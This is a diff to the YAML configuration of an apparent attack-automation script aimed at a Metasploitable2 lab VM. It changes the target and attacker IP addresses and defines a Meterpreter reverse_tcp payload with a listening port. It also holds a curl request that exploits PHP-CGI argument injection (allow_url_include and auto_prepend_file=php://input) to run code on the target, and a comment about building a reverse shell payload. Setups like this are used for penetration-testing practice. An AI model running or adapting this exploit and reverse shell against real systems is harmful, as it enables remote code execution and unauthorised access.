@@ -17,11 +17,11 @@
 #     4. Target a Metasploitable2-VM
 #
 vars:
-  METASPLOITABLE: 172.17.0.106
-  ATTACKER: 172.17.0.127
+  METASPLOITABLE: 192.168.0.146
+  ATTACKER: 192.168.0.29
   PAYLOAD: linux/x86/meterpreter/reverse_tcp
-  LPORT: 4344
-  CURL: 'curl -XPOST "http://172.17.0.106/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"'
+  LPORT: "4344"
+  CURL: 'curl -XPOST "http://192.168.0.146/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"'
 
 commands:
   # create a temporary file for a reverse shell payload
